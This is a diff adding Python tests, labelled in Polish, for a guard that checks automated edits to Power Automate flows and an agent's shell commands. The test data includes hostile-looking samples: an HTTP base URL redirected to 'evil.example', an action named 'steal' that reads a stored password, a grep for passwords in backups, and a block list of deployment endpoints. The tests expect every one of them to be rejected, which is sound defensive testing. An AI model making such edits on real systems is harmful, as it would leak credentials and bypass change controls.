+    wf = {"ismanaged": False, "category": 5, "modifiedon": "m", "clientdata": json.dumps(definition)}
+    return C.flow_patch_live_problems({"oczekiwany_modifiedon": "m", "zmiany": changes}, wf)[0]
+
+
+expect("flow-patch: zmienna z adresem Http odrzucona",
+       any("akcja wysylajaca" in e for e in live4([{"sciezka": A4 + ["Init_base", "inputs", "variables", "0", "value"],
+                                                   "bylo": "https://api.partner.pl", "ma_byc": "https://evil.example"}])), True)
+expect("flow-patch: Compose z naglowkiem Http odrzucony",
+       any("akcja wysylajaca" in e for e in live4([{"sciezka": A4 + ["Compose_naglowek", "inputs"], "bylo": "Basic abc",
+                                                   "ma_byc": "Basic zzz"}])), True)
+expect("flow-patch: Compose bez zwiazku z Http dozwolony",
+       live4([{"sciezka": A4 + ["Compose_tekst", "inputs"], "bylo": "Dzien dobry", "ma_byc": "Witamy"}]), [])
+expect("flow-patch: odczyt wejsc akcji z haslem odrzucony",
+       any("authentication" in e for e in live4([{"sciezka": A4 + ["Compose_tekst", "inputs"], "bylo": "Dzien dobry",
+                                                  "ma_byc": "@actions('H').inputs.authentication.password"}])), True)
+expect("runAfter: status niebedacy tekstem bez wyjatku", bool(C.run_after_problem({"I": [["Succeeded"]]})), True)
+expect("runAfter: ostatni klucz pod body to nie runAfter",
+       C.flow_patch_problems({"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
+                              "zmiany": [{"sciezka": A4 + ["H", "inputs", "body", "runAfter"], "bylo": "a", "ma_byc": "b"}]}, 1)
+       == [] or all("runAfter." not in e for e in C.flow_patch_problems(
+           {"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
+            "zmiany": [{"sciezka": A4 + ["H", "inputs", "body", "runAfter"], "bylo": "a", "ma_byc": "b"}]}, 1)), True)
+
+
+def fd4(change):
+    d = copy.deepcopy(DEF4)
+    change(d["properties"]["definition"]["actions"])
+    return wf_live(DEF4, d)
+
+
+for label, change, needle in [
+    ("SetVariable ustawiajaca adres", lambda a: a.update(Set_base={"type": "SetVariable", "runAfter": {"Compose_tekst": ["Succeeded"]},
+                                                                    "inputs": {"name": "base", "value": "https://evil.example"}}), "akcja wysylajaca"),
+    ("zmiana Compose z naglowkiem", lambda a: a["Compose_naglowek"].update(inputs="Basic zzz"), "akcja wysylajaca"),
+    ("usuniecie akcji z adresem", lambda a: (a.pop("Init_base"), a["Compose_naglowek"].update(runAfter={}),
+                                              a["Compose_tekst"].update(runAfter={})), "akcja wysylajaca"),
+    ("Compose czyta haslo", lambda a: a.update(Kradnij={"type": "Compose", "runAfter": {},
+                                                        "inputs": "@actions('H').inputs.authentication.password"}), "authentication"),
+    ("Type wielka litera", lambda a: a.update(X={"Type": "Http", "runAfter": {}, "inputs": "@json(variables('cfg'))"}), "X"),
+    ("dwa klucze typu", lambda a: a["Compose_tekst"].update(Type="Http"), "wielkoscia liter"),
+    ("typ spoza listy", lambda a: a.update(J={"type": "JavaScriptCode", "runAfter": {}, "inputs": {"code": "x"}}), "JavaScriptCode"),
+    ("akcje jako lista", lambda a: a.update(S={"type": "Scope", "runAfter": {}, "actions": [{"type": "Http"}]}), "S"),
+    ("akcje jako tekst w Http", lambda a: a["H"].update(actions="x"), "H"),
+    ("zamaskowane haslo w tresci", lambda a: a["Compose_tekst"].update(inputs={"password": "***"}), "***"),
+    ("H2 przeniesiona do zakresu o nazwie else", lambda a: (a["I"]["else"]["actions"].pop("H2"), a["I"]["actions"].update(
+        {"else": {"type": "Scope", "runAfter": {}, "actions": {"H2": {"type": "Http", "runAfter": {},
+                                                                     "inputs": {"method": "DELETE", "uri": "https://api.partner.pl/x"}}}}})), "H2"),
+]:
+    expect(f"flow-definition odrzuca: {label}", any(needle in e for e in fd4(change)), True)
+expect("flow-definition: nowa Compose bez zwiazku z Http dozwolona",
+       fd4(lambda a: a.update(Nowa={"type": "Compose", "runAfter": {"Compose_tekst": ["Succeeded"]}, "inputs": "x"})), [])
+diff, _ = C.flow_definition_diff(DEF4, (lambda d: (d["properties"]["definition"]["actions"].update(
+    Nowa={"type": "Compose", "runAfter": {}, "inputs": "@{formatDateTime(utcNow())}"}), d)[1])(copy.deepcopy(DEF4)))
+expect("flow-definition: podglad tresci dodanej akcji", "formatDateTime" in (diff[0].get("podglad") or ""), True)
+
+for label, step, bad in [
+    ("PUT workflows/clientdata", {"metoda": "PUT", "url": f"{DV}/api/data/v9.2/workflows({WF3})/clientdata", "body": {"value": "{}"}}, True),
+    ("PATCH workflows z clientdata", {"metoda": "PATCH", "url": f"{DV}/api/data/v9.2/workflows({WF3})", "body": {"clientdata": "{}"}}, True),
+    ("POST workflows (nowy flow)", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/workflows", "body": {"name": "x"}}, True),
+    ("PATCH workflows statecode", {"metoda": "PATCH", "url": f"{DV}/api/data/v9.2/workflows({WF3})", "body": {"statecode": 0, "statuscode": 1}}, False),
+    ("$batch", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/$batch", "body": {}}, True),
+    ("$batch zakodowany", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/%24batch", "body": {}}, True),
+    ("ImportSolution", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/ImportSolution", "body": {}}, True),
+    ("korekta rekordu", {"metoda": "PATCH", "url": f"{DV}/api/data/v9.2/eko_units({WF3})", "body": {"eko_meteringpoint@odata.bind": "/eko_meteringpoints(x)"}}, False),
+    ("Flow API: nowy flow", {"metoda": "POST", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows?api-version=2016-11-01", "body": {}}, True),
+    ("Flow API: PATCH flow", {"metoda": "PATCH", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}?api-version=2016-11-01", "body": {"properties": {}}}, True),
+    ("Flow API: stop", {"metoda": "POST", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}/stop?api-version=2016-11-01"}, False),
+    ("Flow API: resubmit", {"metoda": "POST", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}/triggers/manual/histories/x/resubmit?api-version=2016-11-01"}, False),
+]:
+    errs = C.step_problems({"nr": 1, "opis": "x", "typ": "http", **step}, 1)
+    expect(f"krok http: {label} {'odrzucony' if bad else 'dozwolony'}", bool(errs), bad)
+for argv, bad in [(["pac", "solution", "import", "--path", "x.zip"], True), (["pac", "solution", "upgrade"], True),
+                  (["az", "logicapp", "deploy"], True), (["pac", "solution", "list"], False)]:
+    expect(f"krok cli: {' '.join(argv)}", bool(C.step_problems({"nr": 1, "opis": "x", "typ": "cli", "argv": argv}, 1)), bad)
+
+INC_DIR = WORK / "zgloszenia" / "FD-1"
+for label, cmd, cwd, want in [
+    ("cat kopii", "cat zgloszenia/FD-1/backup/x.json", WORK, "deny"),
+    ("grep po kopiach", 'grep -r password "zgloszenia/FD-1/backup"', WORK, "deny"),
+    ("cp z kopii", "cp zgloszenia/FD-1/backup/x.json zgloszenia/FD-2/", WORK, "deny"),
+    ("wzgledna kopia z katalogu zgloszenia", "cat backup/x.json", INC_DIR, "deny"),
+    ("z wnetrza backup", "cat x.json", INC_DIR / "backup", "deny"),
+    ("ls zgloszenia", "ls zgloszenia/FD-1", WORK, None),
+    ("backup w innym projekcie", "ls backup/", OTHER, None),
+]:
+    (INC_DIR / "backup").mkdir(parents=True, exist_ok=True)
+    expect(f"powloka i kopie: {label}", guard_in("sesja-29", "Bash", {"command": cmd}, cwd), want)
+
+cfg["flow_patch_dataverse_urls"] = []
+cfg["flow_definition_dataverse_urls"] = []
+C.save_config(cfg)
+
+print("30. 1.2.1: odmowy SharePoint z wyjasnieniem (ITS-418)")
+P = importlib.reload(P)
+P.az_account = lambda: "e2vitservice@ekovoltis.pl"
+GSITE = "https://graph.microsoft.com/v1.0/sites/colpro.sharepoint.com:/sites/BazadokumentowEkovoltis"
+SECRET_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOi.tajny.podpis"
+P.get_token = lambda resource: SECRET_TOKEN
+ANSWERS = {GSITE + ":/drive/root:/Rozliczenia niestandardowe/Template:/children": (403, b'{"error": {"code": "accessDenied"}}'),
+           "https://colpro.sharepoint.com/sites/BazadokumentowEkovoltis/_api/web": (401, b'{"error": "invalid_request"}'),
+           GSITE: (200, b'{"id": "x"}')}
+P.http = lambda m, u, b=None, timeout=90, headers=None: ANSWERS.get(u, (404, b"{}"))
+for label, url, needle in [("Graph 403 na bibliotece", GSITE + ":/drive/root:/Rozliczenia niestandardowe/Template:/children", "e2vitservice"),
+                           ("REST 401", "https://colpro.sharepoint.com/sites/BazadokumentowEkovoltis/_api/web", "przez Graph"),
+                           ("Graph 200 bez uwagi", GSITE, None)]:
+    buf = io.StringIO()
+    with contextlib.redirect_stdout(buf):
+        try:
+            P.cmd_get([url])
+        except SystemExit:
+            pass
+    text_out = buf.getvalue()
+    expect(f"SharePoint: {label}", (needle in text_out) if needle else ("Uwaga:" not in text_out), True)
+    expect(f"SharePoint: {label}: bez tokenu", SECRET_TOKEN in text_out, False)
+expect("SharePoint: 403 z Dataverse bez uwagi o SharePoint", P.access_hint(f"{DV}/api/data/v9.2/x", 403), None)
+expect("SharePoint: 401 z Graph poza witrynami bez uwagi", P.access_hint("https://graph.microsoft.com/v1.0/me", 401), None)
 
 print()
 print("WSZYSTKO OK" if not FAILS else f"NIEUDANE: {FAILS}")
